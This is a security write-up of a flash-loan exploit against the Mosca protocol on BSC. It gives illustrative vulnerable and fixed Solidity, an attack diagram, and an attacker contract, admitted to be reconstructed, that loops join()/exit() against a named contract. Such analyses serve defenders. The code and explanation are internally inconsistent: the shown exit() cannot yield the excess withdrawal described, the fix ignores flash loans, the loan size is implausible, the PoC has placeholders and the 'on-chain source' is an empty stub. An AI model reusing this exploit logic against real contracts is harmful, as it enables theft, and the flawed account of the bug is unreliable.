# Mosca — Flash Loan-Based State Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2025-01-10 |
| **Protocol** | Mosca |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$19,000 |
| **Attacker** | [0xb7d7240c...](https://bscscan.com/address/0xb7d7240c207e094a9be802c0f370528a9c39fed5) |
| **Attack Tx** | [0x4e5bb7e3...](https://bscscan.com/tx/0x4e5bb7e3f552f5ee6ee97db9a9fcf07287aae9a1974e24999690855741121aff) |
| **Vulnerable Contract** | [0x1962b335...](https://bscscan.com/address/0x1962b3356122d6a56f978e112d14f5e23a25037d) |
| **Root Cause** | Lack of fund source validation and state management error during repeated join/exit calls, allowing flash loan funds to be treated as legitimate deposits and enabling excess withdrawals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Mosca_exp.sol) |

---

## 1. Vulnerability Overview

The Mosca protocol uses a `join()` function to deposit funds and `exit()` to withdraw them. The attacker borrowed 1 trillion USDC via a flash loan from PancakeSwap V3, called `join()`, then repeated the `exit()` withdrawal cycle 20 times. Because the protocol did not validate the source of funds, flash loan capital was treated as legitimate deposits. Through repeated cycles, state accumulated incorrectly, making it possible to withdraw more than the protocol actually held.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: join allowed without fund source validation
function join(uint256 amount) external {
    // Only records transferred amount — no flash loan check
    userBalance[msg.sender] += amount;
    totalDeposits += amount;
    IERC20(USDC).transferFrom(msg.sender, address(this), amount);
}

function exit() external {
    uint256 amount = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Withdrawal without state reset → totalDeposits mismatch across repeated cycles
    IERC20(USDC).transfer(msg.sender, amount);
}

// ✅ Safe code: reentrancy protection + fund source validation
function join(uint256 amount) external nonReentrant {
    require(amount > 0, "Zero amount");
    uint256 before = IERC20(USDC).balanceOf(address(this));
    IERC20(USDC).transferFrom(msg.sender, address(this), amount);
    uint256 actual = IERC20(USDC).balanceOf(address(this)) - before;
    userBalance[msg.sender] += actual; // Record actual amount received
    totalDeposits += actual;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Mosca_decompiled.sol
contract Mosca {
    function withdrawFiat(uint256 a, bool b, uint8 c) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Call join() with 1,000 USDC (legitimate deposit)
  │
  ├─→ [2] Obtain 1 trillion USDC flash loan from PancakeSwap V3
  │
  ├─→ [3] Call join() 7 times with 1,000 each (using flash loan funds)
  │         └─ Protocol treats flash loan funds as legitimate deposits
  │
  ├─→ [4] Call exit() 2 times
  │         └─ Accumulated incorrect state enables excess withdrawal
  │
  ├─→ [5] Repeat join() + exit() cycle 20 times
  │         └─ Protocol balance decreases with each cycle
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] Secure ~$19,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract MoscaAttacker {
    address constant MOSCA = 0x1962b3356122d6a56f978e112d14f5e23a25037d;
    address constant USDC = /* USDC address */;

    function attack() external {
        // [1] Legitimate initial deposit
        IERC20(USDC).approve(MOSCA, type(uint256).max);
        IMosca(MOSCA).join(1000 * 1e6);

        // [2] PancakeSwap V3 flash loan (1 trillion USDC)
        IPancakeV3Pool(pool).flash(
            address(this), 0, 1_000_000_000_000 * 1e6, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [3] join() 7 times using flash loan funds
        for (uint256 i = 0; i < 7; i++) {
            IMosca(MOSCA).join(1000 * 1e6);
        }

        // [4] exit() 2 times (excess withdrawal)
        IMosca(MOSCA).exit();
        IMosca(MOSCA).exit();

        // [5] Repeat cycle 20 times
        for (uint256 i = 0; i < 20; i++) {
            IMosca(MOSCA).join(1000 * 1e6);
            IMosca(MOSCA).exit();
        }

        // [6] Repay flash loan
        IERC20(USDC).transfer(pool, loanAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Lack of fund source validation (repeated join/exit treats external funds as legitimate deposits) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan + repeated calls) |
| **DApp Category** | Deposit/Withdrawal Protocol |
| **Impact** | Potential full drainage of protocol funds |

## 6. Remediation Recommendations

1. **Reentrancy Protection**: Apply `ReentrancyGuard`'s `nonReentrant` modifier to all state-changing functions
2. **Flash Loan Detection**: Detect and block join-exit patterns within the same block/transaction
3. **Minimum Lock Period**: Add a condition preventing withdrawals for at least N blocks after deposit
4. **Balance Invariant Verification**: Verify `totalDeposits == sum(userBalances)` at the end of each transaction

## 7. Lessons Learned

- Deposit/withdrawal protocols can become extremely vulnerable when combined with flash loans; repeated calls within a single transaction is the core attack pattern.
- `nonReentrant` only prevents re-entry into the same function — cross-function call patterns such as join → exit must be defended against separately.
- Designs that allow deposits regardless of fund source (i.e., whether flash-loaned) violate protocol invariants.